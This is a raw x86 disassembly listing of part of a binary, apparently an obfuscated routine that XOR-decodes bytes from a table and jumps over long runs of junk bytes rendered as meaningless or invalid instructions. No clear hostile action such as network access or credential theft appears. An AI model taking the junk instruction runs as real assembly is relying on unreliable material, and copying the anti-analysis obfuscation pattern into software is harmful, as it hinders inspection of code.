  4050c1:	stos   DWORD PTR es:[edi],eax
  4050c2:	and    edx,DWORD PTR [eax]
  4050c4:	mov    ebp,0x68bf805c
  4050c9:	(bad)  
  4050ca:	int    0xff
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x6284b002],bh
  4050fc:	icebp  
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x4050d0
  405106:	lahf   
  405107:	adc    cl,BYTE PTR [edi+0x2d]
  40510a:	scas   eax,DWORD PTR es:[edi]
  40510b:	pop    ebp
  40510c:	sahf   
  40510d:	outs   dx,DWORD PTR ds:[esi]
  40510e:	outs   dx,BYTE PTR ds:[esi]
  40510f:	cmp    DWORD PTR [edx-0xa],0xffffffa8
  405113:	call   0xaf52:0xf39309f5
  40511a:	aam    0xd1
  40511c:	sbb    ebx,DWORD PTR [esi+eiz*1-0x5e]
  405120:	push   cs
  405121:	xchg   ebx,eax
  405122:	fwait
  405123:	addr16 ja 0x405116
  405126:	leave  
  405127:	push   edx
  405128:	retf   
  405129:	adc    al,0x6
  40512b:	data16 ins BYTE PTR es:[edi],dx
  40512d:	push   ss
  40512e:	iret   
  40512f:	push   ebx
  405130:	cmp    DWORD PTR [edx-0x74],ebx
  405133:	push   ebp
  405134:	test   DWORD PTR [ecx+0x70],esi
  405137:	lock push ecx
  405139:	cs sub al,0xd0
  40513c:	(bad)  
  40513d:	dec    ebx
  40513e:	sbb    edi,0xffffffa0
  405141:	out    0x9a,al
  405143:	enter  0x1a7b,0xb3
  405147:	xchg   DWORD PTR [edx-0x45c0e21c],esp
  40514d:	es lahf 
  40514f:	loopne 0x405104
  405151:	cmp    al,0xbc
  405153:	dec    edx
  405154:	xor    BYTE PTR [ebx+0x54b46f79],al
  40515a:	pop    eax
  40515b:	and    ecx,DWORD PTR [edi]
  40515d:	bound  ebx,QWORD PTR [eax+0x46]
  405160:	std    
  405161:	gs xchg edi,eax
  405163:	lds    ebp,FWORD PTR [eax+esi*4]
  405166:	aad    0x58
  405168:	and    BYTE PTR ds:0xe3f09da2,bl
  40516e:	push   ss
  40516f:	mov    esp,0xf81877fc
  405174:	fsubr  DWORD PTR [edi-0x53341ce9]
  40517a:	add    bh,ch
  40517c:	sahf   
  40517d:	mov    ?,WORD PTR [eax-0x40]
  405180:	stos   BYTE PTR es:[edi],al
  405181:	jns    0x4051c1
  405183:	push   0xffffffb8
  405185:	sbb    al,0xd2
  405187:	clc    
  405188:	aam    0x35
  40518a:	mov    BYTE PTR [edi+0x23],dh
  40518d:	shl    DWORD PTR [eax],1
  40518f:	loope  0x405167
  405191:	and    ebp,ebp
  405193:	es push eax
  405195:	and    al,0x36
  405197:	sub    eax,0xafe92e9f
  40519c:	push   cs
  40519d:	jl     0x40518b
  40519f:	add    eax,DWORD PTR [ebx]
  4051a1:	mov    eax,ds:0xadd02b05
  4051a6:	in     al,dx
  4051a7:	xchg   DWORD PTR [edi+0x745ed1af],ebx
  4051ad:	xor    DWORD PTR [ebp+0x40],eax
  4051b0:	cmp    DWORD PTR [eax+0x7ef71e1d],0x6
  4051b7:	cmp    DWORD PTR [ebx+ebx*8],edi
  4051ba:	mov    ecx,0xef416621
  4051bf:	xchg   esi,eax
  4051c0:	push   ebx
  4051c1:	cmp    dh,BYTE PTR [ebx]
  4051c3:	mov    esi,0xd396507d
  4051c8:	xchg   edi,eax
  4051c9:	and    al,0xff
  4051cb:	sar    DWORD PTR [eax+0x61],cl
  4051ce:	jne    0x40520f
  4051d0:	xor    al,0xed
  4051d2:	fsub   DWORD PTR [ebx+0x74]
  4051d5:	rcl    DWORD PTR [esi-0x15],0xe0
  4051d9:	mov    dh,0x6d
  4051db:	(bad)  
  4051dc:	ins    DWORD PTR es:[edi],dx
  4051dd:	or     al,0x5b
  4051df:	cli    
  4051e0:	xor    BYTE PTR [eax+0x58],ch
  4051e3:	add    BYTE PTR [eax-0x13],dh
  4051e6:	sub    DWORD PTR [ecx-0x63d0e25d],edx
  4051ec:	add    BYTE PTR [edi],0xc
  4051ef:	dec    esp
  4051f0:	jb     0x4051b8
  4051f2:	mov    ds:0xdfcc0825,al
  4051f7:	and    eax,0xfddad37e
  4051fc:	jne    0x4051a7
  4051fe:	dec    edi
  4051ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405200:	mov    dh,0x3a
  405202:	ins    DWORD PTR es:[edi],dx
  405203:	cmp    ebp,edx
  405205:	adc    BYTE PTR [edi],0x83
  405208:	mov    ebp,0xf1de9f8d
  40520d:	adc    ebx,ecx
  40520f:	ss or  eax,0x5ae6a2bc
  405215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405216:	push   ss
  405217:	push   ebx
  405218:	dec    edx
  405219:	aad    0xbd
  40521b:	and    bl,al
  40521d:	jmp    0x405273
  40521f:	fmul   QWORD PTR es:0x8d23cc89
  405226:	dec    eax
  405227:	retf   0x14e6
  40522a:	es mov ch,0x69
  40522d:	xor    esp,esp
  40522f:	retf   0x276d
  405232:	(bad)  
  405233:	loop   0x4052ae
  405235:	mov    al,0x67
  405237:	xchg   ecx,eax
  405238:	pop    es
  405239:	pushf  
  40523a:	jp     0x4051d9
  40523c:	mov    dl,0x36
  40523e:	jno    0x4051d3
  405240:	rep outs dx,BYTE PTR ds:[esi]
  405242:	pop    esp
  405243:	or     BYTE PTR [edi-0x32f45adc],ch
  405249:	dec    esp
  40524a:	add    DWORD PTR [edi+0x69],eax
  40524d:	mov    ecx,0xb31c4ac0
  405252:	lods   al,BYTE PTR ds:[esi]
  405253:	mov    al,ds:0xdae7fc28
  405258:	pusha  
  405259:	outs   dx,DWORD PTR ds:[esi]
  40525a:	cmp    al,0x48
  40525c:	add    esp,DWORD PTR gs:0x511cb3cb
  405263:	aas    
  405264:	cmp    eax,0xd94fbc96
  405269:	stc    
  40526a:	fadd   QWORD PTR [edx-0x1dbc2a41]
  405270:	fcmovnb st,st(2)
  405272:	jmp    0x5962:0xec4a1aff
  405279:	add    bl,ch
  40527b:	cmc    
  40527c:	inc    esp
  40527d:	add    edx,ebx
  40527f:	imul   eax,esp,0xffffffbb
  405282:	add    ebp,DWORD PTR [esi]
  405284:	adc    bh,BYTE PTR [ecx+0x45ce16a6]
  40528a:	nop
  40528b:	dec    eax
  40528c:	push   ds
  40528d:	mov    dh,0xb2
  40528f:	add    eax,0x1d5d0254
  405294:	mov    dl,0x7d
  405296:	inc    eax
  405297:	sar    BYTE PTR [ebp-0x35c17c02],0xdf
  40529e:	cmp    al,0x9d
  4052a0:	xchg   DWORD PTR [edi-0x49],eax
  4052a3:	cmovo  esp,DWORD PTR [edx]
  4052a6:	cdq    
  4052a7:	adc    DWORD PTR [ebp+0x1711c93d],esp
  4052ad:	push   eax
  4052ae:	arpl   WORD PTR [eax+0x18260b5],di
  4052b4:	cmp    esp,esp
  4052b6:	imul   esi,DWORD PTR [esi-0x4153edd8],0x1c65396d
  4052c0:	inc    esp
  4052c1:	pushf  
  4052c2:	daa    
  4052c3:	inc    DWORD PTR [ebx-0x416fb9f9]
  4052c9:	(bad)  [eax]
  4052cb:	or     ebx,DWORD PTR [esi]
  4052cd:	aad    0xf3
  4052cf:	xchg   edi,eax
  4052d0:	pop    ecx
  4052d1:	stc    
  4052d2:	out    dx,eax
  4052d3:	push   eax
  4052d4:	pop    esp
  4052d5:	dec    ecx
  4052d6:	adc    BYTE PTR [ecx],bl
  4052d8:	retf   
  4052d9:	xchg   BYTE PTR [edi-0x1a],dh
  4052dc:	into   
  4052dd:	mov    al,ds:0x8cb8f6e3
  4052e2:	inc    ecx
  4052e3:	and    DWORD PTR [edx+ecx*8-0x4227cb7d],esp
  4052ea:	adc    cl,bl
  4052ec:	or     BYTE PTR [esi],dl
  4052ee:	stos   BYTE PTR es:[edi],al
  4052ef:	jle    0x4052d6
  4052f1:	lods   al,BYTE PTR ds:[esi]
  4052f2:	sub    al,0x28
  4052f4:	sbb    cl,dh
  4052f6:	stos   DWORD PTR es:[edi],eax
  4052f7:	xchg   BYTE PTR [eax-0x71c162dc],bh
  4052fd:	mov    ds:0xea0c720d,al
  405302:	push   esi
  405303:	and    eax,0x2e514cc4
  405308:	imul   eax,DWORD PTR [ebx-0x46],0x48
  40530c:	cli    
  40530d:	add    dh,ch
  40530f:	ja     0x4052ed
  405311:	cmp    DWORD PTR [eax+0x4d142025],0xffffffa2
  405318:	adc    DWORD PTR [ecx-0xddde50d],eax
  40531e:	popf   
  40531f:	dec    ebx
  405320:	pop    edx
  405321:	xchg   edi,eax
  405322:	pop    edi
  405323:	cmc    
  405324:	sbb    esp,DWORD PTR [eax-0x7caf00ff]
  40532a:	fmul   st,st(7)
  40532c:	test   al,0x4d
  40532e:	in     eax,0x5d
  405330:	adc    ecx,DWORD PTR [ebx]
  405332:	inc    edi
  405333:	xchg   ebp,esi
  405335:	mov    DWORD PTR [esi-0x7375cba6],eax
  40533b:	adc    BYTE PTR [eax+eax*4],ch
  40533e:	dec    esp
  40533f:	fwait
  405340:	xchg   ecx,eax
  405341:	setle  BYTE PTR [edi+0x795507b2]
  405348:	jns    0x4052f1
  40534a:	sbb    dh,BYTE PTR [esi-0xc625810]
  405350:	fnsetpm(287 only) 
  405352:	loop   0x4052d7
  405354:	jbe    0x405352
  405356:	xchg   BYTE PTR [edx+0x35],cl
  405359:	popa   
  40535a:	das    
  40535b:	(bad)  
  40535c:	in     al,0x83
  40535e:	mov    ebp,DWORD PTR [edi]
  405360:	rcr    DWORD PTR [edi+0x6f9f1524],0x6c
  405367:	sbb    DWORD PTR [eax],ebx
  405369:	bound  ebp,QWORD PTR [edx-0x7c]
  40536c:	mov    esp,0xadd82156
  405371:	push   edx
  405372:	or     BYTE PTR [eax-0x44e4a111],bl
  405378:	mov    edx,DWORD PTR [ecx]
  40537a:	xchg   ebx,eax
  40537b:	sbb    ah,dh
  40537d:	jnp    0x4053cc
  40537f:	jae    0x405363
  405381:	dec    edi
  405382:	sbb    DWORD PTR [ebx+0x55],0xffffffb9
  405386:	jo     0x4053c1
  405388:	xchg   edx,ebx
  40538a:	int3   
  40538b:	mov    dl,0xae
  40538d:	cwde   
  40538e:	retf   0xb9fa
  405391:	neg    bl
  405393:	jecxz  0x4053e0
  405395:	fisttp WORD PTR [eax+0x2c9359f5]
  40539b:	xchg   ecx,eax
  40539c:	pop    ss
  40539d:	push   ss
  40539e:	ins    DWORD PTR es:[edi],dx
  40539f:	mov    ebx,0x5a5c06e8
  4053a4:	and    eax,0xea5396e3
  4053a9:	dec    esp
  4053aa:	dec    edi
  4053ab:	gs mov al,0xa7
  4053ae:	and    BYTE PTR [ebx+ebp*8-0x23b19baf],ch
  4053b5:	push   edx
  4053b6:	(bad)  
  4053b7:	pusha  
  4053b8:	inc    DWORD PTR [ecx+ecx*8+0x0]
  4053bc:	scas   eax,DWORD PTR es:[edi]
  4053bd:	cmp    BYTE PTR [esi+ebp*1+0x60],0x6a
  4053c2:	(bad)
  4053c6:	mov    edx,0x32d17ccb
  4053cb:	into   
  4053cc:	inc    edx
  4053cd:	dec    esi
  4053ce:	sub    ecx,DWORD PTR [edx]
  4053d0:	fcmove st,st(3)
  4053d2:	push   ebx
  4053d3:	test   eax,0x8eba9566
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fcom   QWORD PTR [edi+0x72]
  4053ee:	jmp    0x40537e
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x40537f
  4053f9:	out    0xe5,eax
  4053fb:	pop    ds
  4053fc:	pop    esi
  4053fd:	loop   0x4053c2
  4053ff:	fisub  WORD PTR [ecx+0x6e]
  405402:	test   eax,0x6a4235fa
  405407:	xor    DWORD PTR [eax+0x60fe3690],esi
  40540d:	add    DWORD PTR [ebx-0x60],esp
  405410:	push   ds
  405411:	call   0x2d921e3d
  405416:	retf   
  405417:	xchg   bh,ch
  405419:	inc    ebx
  40541a:	cmp    eax,0xb844084
  40541f:	lods   al,BYTE PTR ds:[esi]
  405420:	jmp    0x405443
  405422:	dec    esp
  405423:	xchg   BYTE PTR [esi],bh
  405425:	shl    DWORD PTR [ebx-0x513c978e],0x88
  40542c:	stos   DWORD PTR es:[edi],eax
  40542d:	gs stos DWORD PTR es:[edi],eax
  40542f:	das    
  405430:	sub    eax,0x6ca6da50
  405435:	sar    DWORD PTR [esp+edi*4-0x71],cl
  405439:	jne    0x40540a
  40543b:	ja     0x405453
  40543d:	pop    edx
  40543e:	ins    DWORD PTR es:[edi],dx
  40543f:	jmp    0xf4b3c95
  405444:	test   eax,esi
  405446:	inc    edx
  405447:	not    DWORD PTR [esi-0xe]
  40544a:	fs mov cl,0x54
  40544d:	push   0xf9316300
  405452:	div    al
  405454:	mov    ch,0x4a
  405456:	sub    DWORD PTR [eax],ebp
  405458:	jl     0x4054ce
  40545a:	nop
  40545b:	dec    ebx
  40545c:	(bad)  
  40545d:	xchg   ebp,eax
  40545e:	adc    ebx,DWORD PTR [esp+esi*8+0x1b]
  405462:	xor    BYTE PTR [edi-0x3a941275],bh
  405468:	cwde   
  405469:	jmp    0xe9be24ec
  40546e:	hlt    
  40546f:	das    
  405470:	cmp    bl,BYTE PTR [eax]
  405472:	pop    es
  405473:	and    DWORD PTR ds:0x9a3aa123,esi
  405479:	leave  
  40547a:	aad    0x14
  40547c:	cmp    ebx,DWORD PTR [ebx+0x40c34501]
  405482:	xchg   ebp,eax
  405483:	mov    edi,0x80703bbc
  405488:	(bad)  
  405489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40548a:	xor    esp,ecx
  40548c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40548d:	fdivr  DWORD PTR [ebp+0x31]
  405490:	stc    
  405491:	pop    ebp
  405492:	or     eax,0x11e9104a
  405497:	(bad)  
  405498:	fdivr  DWORD PTR [edi-0x47d55d47]
  40549e:	sahf   
  40549f:	push   ebx
  4054a0:	cmp    edx,DWORD PTR ds:0xfdcf6972
  4054a6:	mov    esp,0x98125bc
  4054ab:	mov    ds:0x95442c77,al
  4054b0:	inc    esi
  4054b1:	test   al,0x62
  4054b3:	mov    eax,ds:0x5e0f8ecb
  4054b8:	iret   
  4054b9:	push   edi
  4054ba:	sub    eax,0x866dcd00
  4054bf:	retf   
  4054c0:	xchg   BYTE PTR [ecx+0x73d15dad],ch
  4054c6:	inc    ebx
  4054c7:	rol    ecx,cl
  4054c9:	(bad)  
  4054cb:	mov    edi,0x16c113bc
  4054d0:	xchg   ebp,eax
  4054d1:	mov    ss,WORD PTR [ecx+0x46]
  4054d4:	sub    DWORD PTR [esi+eiz*4+0x5b27cb10],edi
  4054db:	sbb    ecx,DWORD PTR [edi]
  4054dd:	push   ebx
  4054df:	or     ah,BYTE PTR [ebx-0x80]
  4054e2:	xor    ah,ch
  4054e4:	stos   BYTE PTR es:[edi],al
  4054e5:	(bad)  
  4054e6:	pop    ebp
  4054e7:	imul   esi,DWORD PTR [edx+0x7d57002c],0xec2bbf15
  4054f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f2:	iret   
  4054f3:	and    BYTE PTR [eax],dl
  4054f5:	call   DWORD PTR [edi+0x63]
  4054f8:	and    ebx,DWORD PTR [edi+eiz*1-0x1]
  4054fc:	or     BYTE PTR [esi+0x491b2d9f],0xf2
  405503:	(bad)  
  405504:	sub    al,0x7d
  405506:	mov    dh,0x6a
  405508:	enter  0x2dba,0xbd
  40550c:	xchg   esi,eax
  40550d:	xor    dl,dh
  40550f:	cmp    BYTE PTR [ebx],0x9d
  405512:	inc    edi
  405513:	fiadd  DWORD PTR [ebp+eax*8-0x5daa7706]
  40551a:	inc    ecx
  40551b:	mov    edx,0xc1e0d32f
  405520:	test   BYTE PTR [edx-0x2dc9afb7],0x72
  405527:	int    0x84
  405529:	fst    st(1)
  40552b:	xor    BYTE PTR [ebx+eax*4-0x7a79e24d],al
  405532:	cmp    eax,0x268c7c60
  405537:	jg     0x4055ad
  405539:	pop    ds
  40553a:	cmp    dl,0x5b
  40553d:	sbb    ebx,esp
  40553f:	ins    DWORD PTR es:[edi],dx
  405540:	pop    esp
  405541:	xor    al,0x58
  405543:	inc    edi
  405544:	jge    0x405531
  405546:	push   ss
  405547:	mov    edi,0x323c6b8
  40554c:	fbld   TBYTE PTR [ebx]
  40554e:	fild   QWORD PTR [ecx+0xfb8a22b]
  405554:	dec    ebx
  405555:	mov    edx,0xbd8b5d67
  40555a:	push   cs
  40555b:	sbb    BYTE PTR [ecx-0x7e],al
  40555e:	imul   ecx,edx,0xcc2ea9f
  405564:	shl    esi,cl
  405566:	iret   
  405567:	add    edi,DWORD PTR [ecx]
  405569:	pop    ecx
  40556a:	xchg   ecx,eax
  40556b:	xchg   BYTE PTR [esi],ch
  40556d:	pushf  
  40556e:	jns    0x4055e2
  405570:	add    al,0xce
  405572:	clc    
  405573:	pop    ecx
  405574:	imul   esi,DWORD PTR cs:[eax-0x2a2fb723],0xbd729ea9
  40557f:	outs   dx,BYTE PTR ds:[esi]
  405580:	mov    ds:0x5e3cf0aa,al
  405585:	push   esp
  405586:	add    BYTE PTR [edi+0x5a7f5a64],0x7d
  40558d:	jge    0x405521
  40558f:	pop    esi
  405590:	adc    ebp,ecx
  405592:	xor    BYTE PTR [ebx+eiz*8+0x40],bl
  405596:	nop
  405597:	fwait
  405598:	mov    esp,0xef7ac9f5
  40559d:	stos   DWORD PTR es:[edi],eax
  40559e:	pop    ds
  40559f:	pop    edx
  4055a0:	jo     0x5786c3d8
  4055a6:	aaa    
  4055a7:	and    bl,0x7
  4055aa:	xchg   esi,eax
  4055ab:	sahf   
  4055ac:	push   ecx
  4055ad:	jbe    0x405548
  4055af:	or     eax,0x382e08b8
  4055b4:	div    DWORD PTR [edi]
  4055b6:	arpl   WORD PTR [edx],ax
  4055b8:	jb     0x40556d
  4055ba:	lods   eax,DWORD PTR ds:[esi]
  4055bb:	rcr    DWORD PTR [esi-0x73802dfc],1
  4055c1:	(bad)  
  4055c2:	imul   esi,DWORD PTR [eax*2+0x1e54539],0xcf7ff6e2
  4055cd:	xchg   edx,eax
  4055ce:	pop    edi
  4055cf:	inc    edx
  4055d0:	xchg   esi,eax
  4055d1:	bound  eax,QWORD PTR [ecx+0x3eaf6689]
  4055d7:	push   0xd05ee0cf
  4055dc:	push   cs
  4055dd:	or     DWORD PTR [ebx+0x12],edi
  4055e0:	inc    eax
  4055e1:	in     eax,0x4b
  4055e3:	sbb    al,0xd3
  4055e5:	cwde   
  4055e6:	jp     0x40560a
  4055e8:	pop    eax
  4055e9:	aas    
  4055ea:	into   
  4055eb:	in     eax,dx
  4055ec:	ins    BYTE PTR es:[edi],dx
  4055ed:	int    0xa8
  4055ef:	jp     0x4055cf
  4055f1:	add    BYTE PTR [esi+ecx*2-0x77],bl
  4055f5:	dec    eax
  4055f6:	push   esp
  4055f7:	popa   
  4055f8:	mov    ecx,0xad4a8571
  4055fd:	aad    0xf7
  4055ff:	pop    ebp
  405600:	les    esi,FWORD PTR [eax-0x4282cbf9]
  405606:	stos   DWORD PTR es:[edi],eax
  405607:	iret   
  405608:	jno    0x4055f5
  40560a:	adc    eax,0x92721c94
  40560f:	out    dx,al
  405610:	cmp    DWORD PTR [ebx],0xffffff93
  405613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405614:	cld    
  405615:	test   al,0xf3
  405617:	xor    al,0xb7
  405619:	pop    ss
  40561a:	retf   
  40561b:	daa    
  40561c:	rdmsr  
  40561e:	push   ebp
  40561f:	(bad)  
  405621:	pop    ecx
  405622:	pop    esi
  405623:	stos   BYTE PTR es:[edi],al
  405624:	loop   0x405604
  405626:	mov    ebp,0x46fdf38f
  40562b:	or     edi,DWORD PTR [ebx]
  40562d:	je     0x4055d4
  40562f:	mov    ebp,0x542b3520
  405634:	pop    eax
  405635:	int    0x10
  405637:	mov    edx,0x8401fc0b
  40563c:	mov    ebx,0x814bcebc
  405641:	into   
  405642:	and    al,0x69
  405644:	jmp    0x79066ed
  405649:	es into 
  40564b:	or     BYTE PTR [edi+0x6b],dl
  40564e:	jl     0x4056aa
  405650:	fwait
  405651:	ret    
  405652:	sub    edi,DWORD PTR [eax-0x53974d5a]
  405658:	lahf   
  405659:	add    dl,dl
  40565b:	ret    
  40565c:	mov    esi,0x96fbcdc2
  405661:	test   al,0xf
  405663:	iret   
  405664:	inc    edx
  405665:	sbb    eax,0xa69e7f0
  40566a:	das    
  40566b:	lods   eax,DWORD PTR ds:[esi]
  40566c:	inc    eax
  40566d:	(bad)  
  40566e:	js     0x405625
  405670:	xchg   ebp,eax
  405671:	push   es
  405672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405673:	push   0x54
  405675:	stc    
  405676:	mov    al,0xb8
  405678:	add    edx,DWORD PTR [ecx-0x4a37fcfb]
  40567e:	out    dx,al
  40567f:	aas    
  405680:	je     0x405645
  405682:	daa    
  405683:	mov    esi,0xdc9b1375
  405688:	inc    ecx
  405689:	push   esp
  40568a:	cli    
  40568b:	test   al,0xb0
  40568d:	add    DWORD PTR [edx-0x7ab426e2],eax
  405693:	js     0x40563b
  405695:	ror    DWORD PTR [ecx-0x19],cl
  405698:	pop    edi
  405699:	ret    
  40569a:	popf   
  40569b:	lea    eax,ds:0x93e042c2
  4056a1:	xlat   BYTE PTR ss:[ebx]
  4056a3:	mov    ebp,0x61066a2d
  4056a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a9:	ja     0x4056e5
  4056ab:	sti    
  4056ac:	push   ds
  4056ad:	mov    ds:0xbfbf0066,eax
  4056b2:	mov    dh,0x4c
  4056b4:	pop    ss
  4056b5:	add    al,0x6f
  4056b7:	cli    
  4056b8:	xor    BYTE PTR [ebp+0x646d4f4d],0xd4
  4056bf:	fistp  QWORD PTR [edi-0x610f6175]
  4056c5:	or     al,0xe2
  4056c7:	mov    al,0x5
  4056c9:	and    DWORD PTR [ebx],ecx
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	loopne 0x40570d
  405714:	xchg   ebx,eax
  405715:	mov    dl,BYTE PTR [edx]
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056ca
  40571f:	dec    edi
  405720:	fistp  QWORD PTR [ecx+0x24c7ded4]
  405726:	je     0x40576e
  405728:	dec    edx
  405729:	or     ebx,DWORD PTR [edx-0x11]
  40572c:	xor    DWORD PTR [edx+0x2d],0x1719f5ad
  405733:	mov    dl,0xdf
  405735:	sbb    DWORD PTR [esi+0x72fde597],edx
  40573b:	xlat   BYTE PTR ds:[ebx]
  40573c:	pop    esi
  40573d:	fwait
  40573e:	xchg   BYTE PTR [ecx],bl
  405740:	pusha  
  405741:	aas    
  405742:	mov    DWORD PTR [esi],edx
  405744:	in     al,dx
  405745:	ja     0x405774
  405747:	or     edx,edi
  405749:	loope  0x4056dc
  40574b:	dec    ebx
  40574c:	repz dec ecx
  40574e:	addr16 in eax,0x84
  405751:	pop    ebx
  405752:	rol    DWORD PTR [esi+0x3b],1
  405755:	sub    BYTE PTR [eiz*1+0x14552afe],bl
  40575c:	loop   0x4057a3
  40575e:	push   ss
  40575f:	ja     0x405716
  405761:	pop    ds
  405762:	xchg   ebp,eax
  405763:	pop    ecx
  405764:	sub    DWORD PTR [ebx-0x7862e2c6],esi
  40576a:	jmp    DWORD PTR [edx-0xb537986]
  405770:	es jl  0x4057e0
  405773:	mov    ecx,0xc11d7b88
  405778:	mov    ecx,0x71de9854
  40577d:	ret    
  40577e:	and    eax,edx
  405780:	dec    edi
  405781:	fmul   st,st(3)
  405783:	lea    edi,[esi+edx*8]
  405786:	stos   DWORD PTR es:[edi],eax
  405787:	pusha  
  405788:	mov    ss,ecx
  40578a:	les    esp,FWORD PTR [ebx]
  40578c:	dec    eax
  40578d:	faddp  st(5),st
  40578f:	ret    0x1123
  405792:	jmp    0xadbb:0xb8146446
  405799:	pop    esp
  40579a:	in     al,0xbf
  40579c:	dec    ebx
  40579d:	add    cl,0x53
  4057a0:	sbb    al,al
  4057a2:	ficom  WORD PTR [edx-0x29]
  4057a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057a6:	mov    eax,ds:0xcee99373
  4057ab:	enter  0x55eb,0x39
  4057af:	jbe    0x4057d3
  4057b1:	pop    ebx
  4057b2:	sti    
  4057b3:	sbb    bl,BYTE PTR [ebp-0x46f2f02]
  4057b9:	sbb    BYTE PTR [esi],bl
  4057bb:	and    al,0xb5
  4057bd:	or     DWORD PTR [ebp+0x71bc4906],edi
  4057c3:	mov    ah,0x55
  4057c5:	push   ds
  4057c6:	(bad)  
  4057c7:	sbb    al,cl
  4057c9:	out    dx,al
  4057ca:	cli    
  4057cb:	adc    BYTE PTR [eax],dl
  4057cd:	xor    al,BYTE PTR [eax+0x2b42060d]
  4057d3:	xchg   ebx,eax
  4057d4:	les    ecx,FWORD PTR [edx-0x31e3ac3]
  4057da:	mov    DWORD PTR [edx+0x549f6b3d],esi
  4057e0:	jp     0x405820
  4057e2:	retf   
  4057e3:	loope  0x4057e1
  4057e5:	ins    DWORD PTR es:[edi],dx
  4057e6:	nop
  4057e7:	shr    DWORD PTR [ebx],0x8a
  4057ea:	pop    ebx
  4057eb:	cmp    dl,ch
  4057ed:	lods   al,BYTE PTR ds:[esi]
  4057ee:	add    DWORD PTR [eax-0x6816224e],ebp
  4057f4:	ja     0x405853
  4057f6:	dec    ecx
  4057f7:	fwait
  4057f8:	pop    esi
  4057f9:	sar    DWORD PTR [edi],0xb3
  4057fc:	jp     0x4057bf
  4057fe:	inc    edi
  4057ff:	shl    DWORD PTR [edi-0x75c14a0a],cl
  405805:	xor    bh,dh
  405807:	shl    DWORD PTR [ecx-0x1],1
  40580a:	or     eax,0x4da51fde
  40580f:	add    cl,BYTE PTR [ecx]
  405811:	push   ss
  405812:	in     al,0xb
  405814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405815:	stc    
  405816:	call   0xae1dedbc
  40581b:	add    ah,al
  40581d:	or     bl,BYTE PTR [edx-0x78]
  405820:	mov    ds:0xcea29897,al
  405825:	mov    ebx,DWORD PTR [bx+si+0x2463]
  40582a:	out    0x76,al
  40582c:	lahf   
  40582d:	shl    DWORD PTR [ebx],0xb1
  405830:	ins    BYTE PTR es:[edi],dx
  405831:	xchg   BYTE PTR [esi-0x8272884],bl
  405837:	mov    ds:0x28f1380c,al
  40583c:	je     0x4057fc
  40583e:	inc    eax
  40583f:	addr16 pop ss
  405841:	imul   esp,eax,0xffffffa5
  405844:	aas    
  405845:	test   BYTE PTR [esi+esi*1+0x123970f1],ch
  40584c:	rcl    cl,1
  40584e:	inc    edx
  40584f:	inc    eax
  405850:	out    0x72,eax
  405852:	fidivr WORD PTR [eax+0x46183e27]
  405858:	inc    edx
  405859:	in     eax,dx
  40585a:	cwde   
  40585b:	adc    ebp,edi
  40585d:	in     eax,0xbe
  40585f:	es aas 
  405861:	ret    0x571f
  405864:	mov    bl,0xd7
  405866:	dec    ebp
  405867:	mov    ds:0x5296da65,al
  40586c:	lahf   
  40586d:	pop    es
  40586e:	aaa    
  40586f:	repz or bl,BYTE PTR [eax-0x50]
  405873:	test   eax,0x2f64a2a8
  405878:	cs add eax,0x8ce29909
  40587e:	lock and eax,0x6b26f4c7
  405884:	mov    dl,0x5e
  405886:	lea    ebp,[ebx+0x126a1e37]
  40588c:	sub    DWORD PTR [ebx],eax
  40588e:	xor    dh,0x8a
  405891:	sub    esp,DWORD PTR [edx+0x6c]
  405894:	icebp  
  405895:	mov    bh,0xad
  405897:	scas   eax,DWORD PTR es:[edi]
  405898:	push   0x60
  40589a:	aad    0xdb
  40589c:	repnz stos BYTE PTR es:[edi],al
  40589e:	sbb    DWORD PTR [esp+esi*1],0x26
  4058a2:	call   0x52b2:0xb57520c2
  4058a9:	int    0x66
  4058ab:	adc    eax,0x65d101a4
  4058b0:	fwait
  4058b1:	and    BYTE PTR [edi+0x59],dl
  4058b4:	dec    ebx
